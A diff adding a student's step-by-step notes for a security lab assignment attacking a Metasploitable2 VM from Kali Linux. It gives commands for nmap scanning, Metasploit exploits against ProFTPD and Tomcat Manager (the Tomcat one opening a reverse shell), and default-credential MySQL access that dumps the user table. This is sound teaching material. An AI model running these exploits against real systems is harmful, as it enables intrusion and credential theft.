@@ -1,0 +1,165 @@
+SECURITY CONCEPTS - ASSIGNMENT 2 DETAILED STEP-BY-STEP LAB NOTES
+(AUTHORIZED LAB ONLY)
+
+================================================================= LAB
+ENVIRONMENT
+=================================================================
+Attacker VM : Kali Linux Victim VM : Metasploitable2 Hypervisor : VMware
+Workstation Network : Host-Only or NAT (both VMs must communicate)
+
+Victim Login: Username : msfadmin Password : msfadmin
+
+================================================================= STEP
+1 - START BOTH VMs
+================================================================= 1.
+Open VMware Workstation. 2. Start Kali Linux. 3. Start Metasploitable2.
+4. Wait until both operating systems finish booting.
+
+================================================================= STEP
+2 - FIND IP ADDRESS
+================================================================= On
+Kali: ip a OR ifconfig
+
+Note the IPv4 address (example: 192.168.56.101)
+
+On Metasploitable2: ifconfig
+
+Note the IPv4 address (example: 192.168.56.102)
+
+Purpose: The attacker must know the victim IP before scanning.
+
+================================================================= STEP
+3 - TEST CONNECTIVITY
+=================================================================
+Command: ping 192.168.56.102
+
+Expected: 64 bytes from 192.168.56.102 …
+
+Press Ctrl+C to stop.
+
+Purpose: Confirms network connectivity.
+
+================================================================= STEP
+4 - DISCOVER SERVICES
+=================================================================
+Command: nmap -sV 192.168.56.102
+
+Explanation: -sV detects service versions.
+
+Typical output: 21/tcp ftp 22/tcp ssh 23/tcp telnet 80/tcp http 3306/tcp
+mysql 8180/tcp tomcat
+
+=================================================================
+QUESTION 1 - FTP (ProFTPD)
+================================================================= Goal:
+Identify the vulnerable FTP service and demonstrate exploitation in the
+lab.
+
+Start Metasploit: msfconsole
+
+Search: search proftpd
+
+Show exploit information: info exploit/unix/ftp/proftpd_modcopy_exec
+
+Use module: use exploit/unix/ftp/proftpd_modcopy_exec
+
+Show options: show options
+
+Configure: set RHOSTS 192.168.56.102
+
+Verify: show options
+
+Run: exploit
+
+If successful you may receive a shell.
+
+Verification: pwd whoami uname -a exit
+
+Explanation: RHOSTS = victim IP. exploit = launches the selected module.
+pwd = current directory. whoami = current user.
+
+=================================================================
+QUESTION 2 - MySQL
+================================================================= Goal:
+Access the MySQL service and enumerate databases.
+
+Connect: mysql -h 192.168.56.102 -u root -p
+
+If prompted, try the lab’s default credentials.
+
+After login:
+
+show databases;
+
+Select database: use mysql;
+
+Display tables: show tables;
+
+Describe a table: describe user;
+
+Read data: select * from user;
+
+Exit: exit
+
+Purpose: Demonstrates database enumeration and highlights the risk of
+weak credentials.
+
+=================================================================
+QUESTION 3 - AJP13 / TOMCAT
+================================================================= Start:
+msfconsole
+
+Search: search tomcat
+
+Use: use exploit/multi/http/tomcat_mgr_upload
+
+Show options: show options
+
+Configure: set RHOSTS 192.168.56.102 set RPORT 8180 set HttpUsername
+tomcat set HttpPassword tomcat set LHOST 192.168.56.101
+
+Run: exploit
+
+Verify: sysinfo pwd shell exit
+
+Explanation: LHOST = attacker’s IP used for reverse connection.
+
+=================================================================
+QUESTION 4 - HTTP / TOMCAT
+================================================================= Open
+browser: http://192.168.56.102:8180
+
+If Tomcat Manager is enabled: Login with the lab credentials if
+instructed by your faculty.
+
+Alternative: Use the same Metasploit Tomcat Manager upload module shown
+above.
+
+=================================================================
+IMPORTANT COMMANDS
+================================================================= ip a
+ifconfig ping nmap -sV msfconsole search info use show options set
+RHOSTS set RPORT set HttpUsername set HttpPassword set LHOST exploit pwd
+whoami uname -a sysinfo shell exit
+
+================================================================= COMMON
+VIVA QUESTIONS
+================================================================= 1.
+What is Nmap? Network scanner used for host and service discovery.
+
+2.  What is Metasploit? Framework used to test and demonstrate known
+    vulnerabilities.
+
+3.  What is RHOSTS? Target machine IP.
+
+4.  What is LHOST? Attacker machine IP.
+
+5.  Difference between vulnerability scanning and exploitation? Scanning
+    identifies weaknesses; exploitation demonstrates whether they can be
+    leveraged in an authorized environment.
+
+6.  Why is Metasploitable2 used? It is an intentionally vulnerable
+    operating system designed for training.
+
+================================================================= END OF
+NOTES
